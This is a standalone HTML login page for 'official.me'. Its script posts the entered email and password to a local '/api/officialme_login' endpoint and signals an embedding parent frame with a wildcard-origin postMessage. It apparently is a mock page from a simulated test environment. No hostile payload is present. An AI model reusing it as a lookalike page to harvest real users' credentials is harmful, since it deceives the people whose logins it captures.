<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>official.me – Login</title>
  <style>
    *, *::before, *::after {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
 
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
      background: #ffffff;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px;
    }
 
    .card {
      width: 100%;
      max-width: 540px;
      background: #ffffff;
      padding: 48px 40px 40px;
    }
 
    /* ── Logo ── */
    .logo {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 18px;
      gap: 3px;
    }
 
    .logo-text {
      font-size: 34px;
      font-weight: 800;
      color: #111111;
      letter-spacing: -0.5px;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
    }
 
    /* ── Welcome Back ── */
    .welcome {
      text-align: center;
      font-size: 20px;
      font-weight: 700;
      color: #111111;
      margin-bottom: 32px;
    }
 
    /* ── Form Fields ── */
    .field {
      margin-bottom: 20px;
    }
 
    .field label {
      display: block;
      font-size: 14px;
      font-weight: 700;
      color: #111111;
      margin-bottom: 8px;
    }
 
    .field input {
      width: 100%;
      padding: 14px 16px;
      border: 1.5px solid #d1d5db;
      border-radius: 8px;
      font-size: 15px;
      color: #111;
      background: #fff;
      outline: none;
      transition: border-color 0.18s;
    }
 
    .field input::placeholder {
      color: #adb5bd;
      font-size: 15px;
    }
 
    .field input:focus {
      border-color: #6366f1;
    }
 
    /* ── Login Button ── */
    .btn-login {
      width: 100%;
      padding: 16px;
      margin-top: 8px;
      margin-bottom: 16px;
      border: none;
      border-radius: 8px;
      background: #5b5fe8;
      color: #ffffff;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      letter-spacing: 0.1px;
      transition: background 0.18s;
    }
 
    .btn-login:hover {
      background: #4a4ed6;
    }
 
    /* ── Forgot Password ── */
    .forgot-wrap {
      text-align: right;
    }
 
    .forgot {
      font-size: 14px;
      color: #5b5fe8;
      text-decoration: none;
    }
 
    .forgot:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
 
<div class="card">
 
  <!-- Logo -->
  <div class="logo">
    <svg width="38" height="38" viewBox="0 0 38 38" fill="none" xmlns="http://www.w3.org/2000/svg">
      <!-- Outer blue filled circle -->
      <circle cx="19" cy="19" r="19" fill="#5b5fe8"/>
      <!-- Inner white C-shaped curve (open on the right side, like letter e) -->
      <path d="M 27 19 A 9 9 0 1 0 27 21" stroke="white" stroke-width="3" fill="none" stroke-linecap="round"/>
    </svg>
    <span class="logo-text">fficial.me</span>
  </div>
 
  <!-- Welcome Back -->
  <p class="welcome">Welcome Back</p>
 
  <!-- Email -->
  <div class="field">
    <label for="email">Email Address</label>
    <input id="email" type="email" placeholder="Email" />
  </div>
 
  <!-- Password -->
  <div class="field">
    <label for="password">Password</label>
    <input id="password" type="password" placeholder="Password" />
  </div>
 
  <!-- Login Button -->
  <button class="btn-login" id="loginBtn">Login</button>
 
  <!-- Forgot Password -->
  <div class="forgot-wrap">
    <a href="#" class="forgot">Forgot Password?</a>
  </div>
 
</div>
 
<script>
document.getElementById('loginBtn').addEventListener('click', async () => {
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!email || !password) return;

    const apiHost = window.location.protocol === 'file:' ? 'http://localhost:5001' : '';
    const endpoint = apiHost + '/api/officialme_login';

    try {
        await fetch(endpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password })
        });
        
        if (window.parent && window.parent !== window) {
            window.parent.postMessage({ type: 'OFFICIALME_LOGIN_DONE' }, '*');
        }
    } catch (err) {
        console.error('Error submitting official.me login:', err);
    }
});
</script>
</body>
</html>
